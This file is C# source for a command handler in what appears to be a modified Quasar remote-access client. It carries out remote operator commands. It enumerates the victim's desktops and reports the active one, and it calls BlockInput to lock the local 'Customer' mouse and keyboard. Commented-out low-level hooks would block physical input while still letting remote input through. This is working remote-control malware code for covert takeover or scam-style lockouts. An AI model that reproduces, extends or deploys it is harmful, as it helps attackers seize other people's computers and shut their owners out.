using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.ServiceModel.Channels;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class CustomCommandHandler : IMessageProcessor
    {
        private IntPtr _keyboardHookID = IntPtr.Zero;
        private IntPtr _mouseHookID = IntPtr.Zero;

        private Form _mainForm;

        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
        public delegate IntPtr mouseHookProc(int nCode, IntPtr wParam, IntPtr lParam);

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105; 
        const int WH_MOUSE_LL = 14;
        const int WM_MOUSEMOVE = 0x0200;
        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        private const uint LLKHF_INJECTED = 0x10;

        [StructLayout(LayoutKind.Sequential)]
        private struct MSLLHOOKSTRUCT
        {
            public POINT pt;
            public uint mouseData;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        private const uint LLMHF_INJECTED = 0x01;

        private const uint LLKHF_INPFLAG = 0x0C;
        private const uint LLMHF_INPFLAG = 0x14;

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool fBlockIt);

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, StringBuilder pvInfo, int nLength, out int lpnLengthNeeded);
        [StructLayout(LayoutKind.Sequential)]
        struct THREADENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ThreadID;
            public uint th32OwnerProcessID;
            public int tpBasePri;
            public int tpDeltaPri;
            public uint dwFlags;
        }
        const int UOI_NAME = 2;

        public CustomCommandHandler(Form mainForm)
        {
            _mainForm = mainForm; // Store reference to the main form
        }

        static string GetDesktopName(IntPtr hDesktop)
        {
            int lengthNeeded;
            // First call to get length
            GetUserObjectInformation(hDesktop, UOI_NAME, null, 0, out lengthNeeded);

            if (lengthNeeded == 0)
                return null;

            StringBuilder sb = new StringBuilder(lengthNeeded);
            if (GetUserObjectInformation(hDesktop, UOI_NAME, sb, sb.Capacity, out _))
            {
                return sb.ToString();
            }

            return null;
        }

        static int currentDesktopIndex = 0;

        public bool CanExecute(IMessage message) => message is DoCustomCommand;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoCustomCommand msg:
                    Execute(sender, msg);
                    break;
                default:
                    break;
            }
        }

        private void Execute(ISender client, DoCustomCommand message)
        {
            if (message.Type == CustomCommandType.GET_ACTIVE_DESKTOP)
            {
                IntPtr hInputDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U);
                string strDesktopName = GetDesktopName(hInputDesktop);
                client.Send(new DesktopsInformationResponse { ActiveDesktop = strDesktopName, Desktops = "NULL" });
            }
            else if (message.Type == CustomCommandType.GET_DESKTOPS)
            {
                IntPtr hInputDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U);
                string activeDesktopName = GetDesktopName(hInputDesktop);

                List<string> desktopNames = new List<string>();
                NativeMethods.EnumDesktops(NativeMethods.GetProcessWindowStation(), delegate (string desktop, IntPtr lParam)
                {
                    desktopNames.Add(desktop);
                    return true;
                }, IntPtr.Zero);

                string joinedStr = string.Join("|", desktopNames.ToArray());
                client.Send(new DesktopsInformationResponse { Desktops = joinedStr, ActiveDesktop = activeDesktopName });
            }
            else if (message.Type == CustomCommandType.DISABLE_CST_MOUSE)
            {
                //Task.Run(() =>
                //{
                //_mainForm.Invoke(new Action(() =>
                //{
                //    try
                //    {
                //        IntPtr hInstance = NativeMethods.LoadLibrary("user32.dll");
                //        //_mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, hInstance, 0);
                //        if (_mouseHookID != IntPtr.Zero)
                //        {
                //            client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Disabled!" });
                //        }
                //    }
                //    catch (Exception ex)
                //    {
                //        client.Send(new NotifyMessageToServer { Message = "Exception From Mouse Disable: " + ex.Message });
                //    }
                //}));
                BlockInput(true);
                //});
            }
            else if (message.Type == CustomCommandType.ENABLE_CST_MOUSE)
            {
                //Task.Run(() =>
                //{
                //_mainForm.Invoke(new Action(() =>
                //{
                //    if (_mouseHookID != IntPtr.Zero)
                //    {
                //        UnhookWindowsHookEx(_mouseHookID);
                //        _mouseHookID = IntPtr.Zero;
                //        client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Enabled!" });
                //    }
                //}));
                //});
                BlockInput(false);
            }
            else if (message.Type == CustomCommandType.DISABLE_CST_KEYBOARD)
            {
                //Task.Run(() =>
                //{
                    //_mainForm.Invoke(new Action(() =>
                    //{
                    //    try
                    //    {
                    //        IntPtr hInstance = NativeMethods.LoadLibrary("User32");
                    //        _keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, hInstance, 0);
                    //        if (_keyboardHookID != IntPtr.Zero)
                    //        {
                    //            client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Disabled!" });
                    //        }
                    //    }
                    //    catch (Exception ex)
                    //    {
                    //        client.Send(new NotifyMessageToServer { Message = "Exception From Keyboard Diable: " + ex.Message });
                    //    }
                    //}));
                //});
            }
            else if (message.Type == CustomCommandType.ENABLE_CST_KEYBOARD)
            {
                //Task.Run(() =>
                //{
                    //_mainForm.Invoke(new Action(() =>
                    //{
                    //    if (_keyboardHookID != IntPtr.Zero)
                    //    {
                    //        UnhookWindowsHookEx(_keyboardHookID);
                    //        _keyboardHookID = IntPtr.Zero;
                    //        client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Enabled!" });
                    //    }
                    //}));
                //});
            }
        }   
        public int KeyboardHookCallback(int nCode, int wParam, ref keyboardHookStruct lParam)
        {
            if (nCode > 0)
            {
                //KBDLLHOOKSTRUCT kbStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                //if ((int)kbStruct.dwExtraInfo != 0x0AA)
                //{
                //    return (IntPtr)1; // Block only physical input for remote kernel-keyboard
                //}
            }
            return CallNextHookEx(_keyboardHookID, nCode, wParam, ref lParam);
        }
        //public IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        //{
        //    if (nCode > 0)
        //    {
        //        MSLLHOOKSTRUCT msStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
        //        //if ((int)msStruct.dwExtraInfo != 0x0AB)
        //        //{
        //        //    return (IntPtr)1; // Block only physical input for remote kernel-mouse
        //        //}
        //    }
        //    return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
        //}
    }
}
